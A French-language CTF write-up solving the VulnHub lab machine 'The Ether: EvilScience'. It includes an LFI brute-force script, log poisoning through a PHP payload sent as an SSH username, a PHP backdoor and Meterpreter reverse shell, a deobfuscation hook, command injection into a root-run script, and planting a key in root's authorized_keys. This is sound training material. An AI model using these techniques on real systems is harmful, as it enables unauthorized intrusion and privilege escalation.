# Solution du CTF The Ether: EvilScience de VulnHub

A propos
--------

[The Ether: EvilScience](https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/) est un CTF de type boot2root proposé par *f1re\_w1re* et téléchargeable sur *VulnHub*.  

Le synopsis ? Une entreprise baptisée *The Ether* prétend avoir créé un élixir qui améliore la santé humaine ce qui laisse sceptique le *CDC* (organisme publique national de santé aux US).  

L'objectif de la mission est de trouver s'ils dissimulent quelque chose.  

Un scan et une première faille
------------------------------

```plain
Nmap scan report for 192.168.1.10
Host is up (0.0058s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 12:09:bc:b1:5c:c9:bd:c3:ca:0f:b1:d5:c3:7d:98:1e (RSA)
|_  256 de:77:4d:81:a0:93:da:00:53:3d:4a:30:bd:7e:35:7d (ECDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: The Ether
MAC Address: 08:00:27:77:1D:CC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

La liste des ports ouverts est plutôt classique pour un CTF de ce type.  

Sur le site web qui est le site de l'entreprise on note une adresse email *wearethebody@theether.com* au cas où.  

Un scan [Wapiti 3.0.0](http://wapiti.sourceforge.net/) nous remonte une anomalie pour le fichier *index.php*. Le bug aurait aussi pu être trouvé à la mano puisque c'est le seul script qui prend un argument sur le site.  

```plain
curl -D- "http://192.168.1.10/?file=index.php"
HTTP/1.0 500 Internal Server Error
Date: Wed, 29 Nov 2017 22:02:38 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

Les liens présents sur le site passent les fichiers *research.php* et *about.php* en argument.  

Un petit coup de buster permet de confirmer que ces fichiers sont dans le même dossier, à la racine :  

```plain
http://192.168.1.10/about.php - HTTP 200 (1252 bytes, gzip)
http://192.168.1.10/index.php - HTTP 200 (1312 bytes, gzip)
http://192.168.1.10/research.php - HTTP 200 (3287 bytes, gzip)
```

En jouant un peu avec cette vulnérabilité d'inclusion PHP (vraisemblablement d'après l'erreur 500) on se rend compte que l'on peut inclure un path relatif:  

```plain
192.168.1.10/index.php?file=layout/styles/layout.css
```

on peut aussi remonter dans l'arborescence :  

```plain
192.168.1.10/index.php?file=images/../layout/styles/layout.css
```

on peut aussi faire référence au dossier local  

```plain
http://192.168.1.10/index.php?file=./layout/styles/layout.css
```

pourtant en passant des paths [de fichiers bien connus](https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-InterestingFiles.txt) on ne remonte rien...  

Ma première idée a été de brute-forcer le nom du répertoire courant qui pourrait me donner d'autres idées par la suite :  

```plain
import sys

import requests

url = "http://192.168.1.10/?file=../{}/research.php"

sess = requests.session()
with open(sys.argv[1], errors="ignore") as fd:
    for i, line in enumerate(fd):
        word = line.strip()
        response = sess.get(url.format(word))
        if "An Overview Of The Human Genome Project" in response.text:
            print(">>", word)
            break
        if i % 5000 == 0:
            print(word)
```

Je fini ainsi par trouver que le répertoire courant se nomme *public\_html*, ainsi on retrouve bien le contenu de la page about avec l'URL suivante :  

```plain
http://192.168.1.10/?file=../public_html/about.php
```

Les dossiers *public\_html* sont souvent utilisés à l'intérieur du home d'un utilisateur donc j'ai essayé de retrouver ce username en brute-forçant le répertoire au dessus, en essayant *ether*, *theether*, etc, sans succès.  

Après coup il apparaît que je n'étais pas si loin... dommage :(  

Que la lumière soit
-------------------

Décu mais pas désemparé j'ai testé d'inclure d'autres fichiers du système et j'obtiens finalement un résultat intéressant avec *auth.log* :  

```plain
http://192.168.1.10/?file=../../../../../../../../../../../../var/log/auth.log
```

Ce fichier de log enregistre les infos d'ouverture de session, sudo et aussi les échecs.  

La seule (légère) difficulté consiste alors à injecter du code PHP dans ce fichier de log. Cela se fait facilement en spécifiant un utilisateur très particulier à SSH :)  

```plain
ssh -l '<?php phpinfo() ?>' 192.168.1.10
```

Une backdoor PHP uploadée plus tard (*wget* est présent sur le système), on se rend compte qu'on est dans le dossier */var/www/html/theEther.com/public\_html*.  

Pas dans un dossier utilisateur donc mais le répertoire d'au dessus contenait bien theether.  

Il y a les fichiers suivants dans le dossier :  

```plain
total 11336
drwxrwxr-x 4 root     www-data        4096 Jan 14 06:51 .
drwxr-xr-x 5 root     root            4096 Oct 23 18:31 ..
-rwxrwxr-x 1 root     www-data        5891 Oct 23 19:27 about.php
drwxrwxr-x 3 root     www-data        4096 Oct 23 18:02 images
-rwxrwxr-x 1 root     www-data        6495 Oct 23 20:48 index.php
drwxrwxr-x 4 root     www-data        4096 Oct 23 18:02 layout
-rwxrwxr-x 1 root     www-data        5006 Oct 23 18:02 licence.txt
-rwxrwxr-x 1 root     www-data       10641 Oct 23 19:26 research.php
-rwsrwsr-x 1 root     evilscience 11527272 Nov 23 19:41 xxxlogauditorxxx.py
```

Pour info voici le filtrage qui nous embêtait dans *index.php* :  

```php
<?php
$file = $_GET["file"];

$file = str_ireplace("etc","", $file);
$file = str_ireplace("php:","", $file);
$file = str_ireplace("expect:","", $file);
$file = str_ireplace("data:","", $file);
$file = str_ireplace("proc","", $file);
$file = str_ireplace("home","", $file);
$file = str_ireplace("opt","", $file);

if ($file == "/var/log/auth.log") {
header("location: index.php");
}
else{
include($file);
}

include($file);
?>
```

On uploade un Meterpreter (x86/reverse\_tcp) qui nous permet d'avoir un shell agréable.  

Et la lumière fut
------------------

Passons maintenant au fichier *xxxlogauditorxxx.py*. Ce dernier est setuid root et setgid *evilscience*... ce qui ne sert à rien puisqu'il s'agit d'un script Python et non d'un binaire ELF...  

Mais si on exécute *sudo -l* on voit que notre utilisateur (*www-data*) peut utiliser ce script avec les privilèges root.  

Je ne posterais pas ici le contenu du script qui est énorme mais pour résumer il y a plusieurs variables (*love, joy, god, destiny, magic*) qui sont des chaines avec des caractères échappés :  

```python
joy = '\x72\x6f\x74\x31\x33'
```

Ici la valeur de joy est 'rot13' ce qui laisse voir qu'un codage est réalisé.  

Le script import aussi les modules base64 et codecs, donc il y a d'autres codages réalisés.  

A la fin du fichier il y a une première évaluation dont le résultat est affecté à une variable baptisée *trust*.  

L'équivalence Python est la suivante :  

```python
trust = magic + codecs.decode(love, joy) + god+ codecs.decode(destiny, joy)
```

Puis sur la dernière ligne on trouve un appel à *eval()* sur le résultat d'un *compile()*.  

Si on se débrouille pour intercepter le résultat avant exécution on obtient un fichier quasi-identique à celui d'origine : seul le contenu initial des variables change. On peut procéder comme ça une dizaine de fois et on est toujours pas à la fin du processus... Il faut donc trouver une astuce  

Etant donné que le format de décodage se répète avec à chaque fois un appel à *compile()* il suffit d'autoriser le script à s'exécuter jusqu'à ce que l'entrée de *compile()* contienne du code sans référence à *compile()* (c'est à dire sur l'avant dernière boucle de déobfuscation).  

Pour celà il suffit de hooker la fonction en début du fichier. On appelle le *compile()* original tant que l'on trouve un appel à la fonction dans le code passé en argument, sinon on affiche le code reçu.  

```python
original_compile = compile
def compile(string, a, b):
  if "compile(" not in string:
      print(string)
      exit()
  else:
    return original_compile(string, a, b)
```

On lance notre *xxxlogauditorxxx.py* modifié et il nous crache alors le code déobfusqué :  

```python
import os
def banner():
        print "==============================="
        print "Log Auditor"
        print "==============================="
        print "Logs available"
        print "-------------------------------"
        print "/var/log/auth.log"
        print "/var/log/apache2/access.log"
        print "-------------------------------"
        print ""

banner()
authlog = "/var/log/auth.log"
accesslog = "/var/log/apache2/access.log"

try:
        audit = raw_input("Load which log?: ").replace(";","").replace("&","").replace("&&","")
        if authlog in audit or accesslog in audit:
                os.system("cat " + audit)
        else:
                print "[-] Invalid log."
except:
        print "\n[-] Something broke :("
```

La faille de ce script est évidente : *os.system* est appelé mais les caractères | (pipe) ou ` (backtick) ne sont pas supprimés, permettant ainsi d'injecter nos commandes.  

A partir de là plusieurs exploitations sont possibles mais j'ai opté pour la création du fichier */root/.ssh/authorized\_keys* contenant ma clé publique SSH (en plusieurs étapes: création du dossier, copie, chmod).  

Dans */root* on trouve l'image *flag.png* avec le message *"Sorry, this is not the flag, but what you are looking for is near. Look within yourself to find the answer you seek"*.  

Une recherche sur l'ensemble du système pour trouver des fichiers dont le nom contient *flag* n'apporte rien d'intéressant.  

Un strings sur le fichier *flag.png* montre une chaîne base64 rajoutée en fin de fichier.  

```plain
root@theEther:/home/evilscience# strings /root/flag.png | grep flag | cut -d' ' -f2 | base64 -d
october 1, 2017.
We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!

October 3, 2017.
The first human test was conducted. Our surgeons have injected a female subject with the first strain of a benign virus. No reactions at this time from this patient.

October 3, 2017.
Something has gone wrong. After a few hours of injection, the human specimen appears symptomatic, exhibiting dementia, hallucinations, sweating, foaming of the mouth, and rapid growth of canine teeth and nails.

October 4, 2017.
Observing other candidates react to the injections. The ether seems to work for some but not for others. Keeping close observation on female specimen on October 3rd.

October 7, 2017.
The first flatline of the series occurred. The female subject passed. After decreasing, muscle contractions and life-like behaviors are still visible. This is impossible! Specimen has been moved to a containment quarantine for further evaluation.

October 8, 2017.
Other candidates are beginning to exhibit similar symptoms and patterns as female specimen. Planning to move them to quarantine as well.

October 10, 2017.
Isolated and exposed subject are dead, cold, moving, gnarling, and attracted to flesh and/or blood. Cannibalistic-like behaviour detected. An antidote/vaccine has been proposed.

October 11, 2017.
Hundreds of people have been burned and buried due to the side effects of the ether. The building will be burned along with the experiments conducted to cover up the story.

October 13, 2017.
We have decided to stop conducting these experiments due to the lack of antidote or ether. The main reason being the numerous death due to the subjects displaying extreme reactions the the engineered virus. No public announcement has been declared. The CDC has been suspicious of our testings and are considering martial laws in the event of an outbreak to the general population.

--Document scheduled to be shredded on October 15th after PSA.
```

Game over
---------

Un peu déçu par ce challenge qui certes propose des cas qui changent un peu mais qui est au final peu réaliste, comme par exemple les permissions sur *auth.log* qui sont loin de ce que l'on peut trouver dans la réalité :  

```plain
-rw-r----- 1 syslog adm /var/log/auth.log
```

Tout comme le filtre dans *index.php* quelque peu ridicule...

*Published January 22 2018 at 16:15*